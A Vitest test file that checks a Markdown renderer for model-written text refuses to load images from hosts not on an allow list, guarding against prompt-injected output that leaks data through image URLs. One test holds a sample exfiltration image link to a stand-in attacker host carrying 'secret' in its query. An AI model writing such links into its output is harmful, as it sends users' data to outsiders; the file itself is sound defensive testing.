/**
 * Model-written Markdown loads no image from a host it was not given:
 * an image URL fetches on render, so text the model was steered into
 * writing could otherwise send the reader's address anywhere.
 */

import { describe, expect, it, vi } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";

vi.mock("katex/dist/katex.min.css", () => ({}));

const { Markdown } = await import("../base/ui/ai-markdown/ai-markdown");

const render = (text: string, imagePrefixes?: string[]) =>
  renderToStaticMarkup(
    <Markdown imagePrefixes={imagePrefixes}>{text}</Markdown>
  );

describe("Markdown images", () => {
  it("does not load an image from an arbitrary host", () => {
    const html = render("![x](https://attacker.example/p?d=secret)");
    expect(html).not.toContain('src="https://attacker.example');
  });

  it("loads one from a host the product allows", () => {
    const html = render("![logo](https://cdn.example.com/logo.png)", [
      "https://cdn.example.com/",
    ]);
    expect(html).toContain('src="https://cdn.example.com/logo.png"');
  });

  it("keeps ordinary links", () => {
    const html = render("[docs](https://docs.example.com)");
    expect(html).toContain('data-streamdown="link"');
    expect(html).toContain("docs");
  });
});
